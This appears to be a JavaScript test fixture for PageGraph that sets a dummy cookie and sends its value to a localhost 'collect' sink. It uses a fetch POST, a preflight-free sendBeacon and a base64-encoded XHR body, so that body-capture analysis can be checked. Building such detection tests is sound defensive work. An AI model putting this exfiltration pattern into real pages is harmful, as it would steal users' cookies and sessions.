// Sets a cookie, then leaks its value in HTTP request bodies only — never in a
// URL, header, or JS argument that PageGraph records.
//
// This is the case the graph alone cannot prove: without body capture, the
// `fetch` below is indistinguishable from a bodyless ping. The token is
// deliberately long and unique so an analysis pass can match it as a substring.

const cookieName = 'exfil-cookie'
const cookieValue = 'exval-91239-abcdef'
// The sink listener runs one port above the static server, the same convention
// the test harness uses, so this fixture works under any test port.
const collectUrl = `http://127.0.0.1:${Number(location.port) + 1}/collect`

document.cookie = `${cookieName}=${cookieValue}; path=/`

// Read it back through document.cookie, so the graph records a read whose value
// then flows into a body.
const jar = document.cookie
const readValue = jar
  .split(';')
  .map((pair) => pair.trim())
  .filter((pair) => pair.startsWith(`${cookieName}=`))
  .map((pair) => pair.slice(cookieName.length + 1))[0]

// Channel 1: JSON POST body.
fetch(collectUrl, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ c: readValue, jar })
})

// Channel 2: sendBeacon with a text/plain Blob (a CORS-simple request, so it
// leaves the browser without a preflight).
navigator.sendBeacon(
  collectUrl,
  new Blob([`beacon=${readValue}`], { type: 'text/plain' })
)

// Channel 3: form-urlencoded POST via XHR, base64-encoded, to check that an
// analysis pass matches encoded variants and not just raw substrings.
const xhr = new XMLHttpRequest()
xhr.open('POST', collectUrl, true)
xhr.setRequestHeader('Content-Type', 'text/plain')
xhr.send(`b64=${btoa(readValue)}`)
